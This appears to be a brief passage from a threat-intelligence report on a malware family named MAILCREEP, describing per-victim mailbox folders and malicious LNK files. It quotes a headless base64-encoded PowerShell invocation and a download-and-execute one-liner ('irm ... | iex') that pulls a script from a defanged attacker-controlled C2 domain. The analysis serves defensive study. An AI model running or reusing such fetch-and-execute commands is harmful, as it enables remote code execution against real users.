For each victim, MAILCREEP creates a folder in the mailbox using the victim's identifier (formatted as
[username]-[random number]
).

These LNK files execute commands such as: --headless powershell -e [base64 powershell command]
to execute a PowerShell script retrieved from a threat actor-controlled C2 server (e.g., irm https://hcidoc[.]in/[path] | iex
).

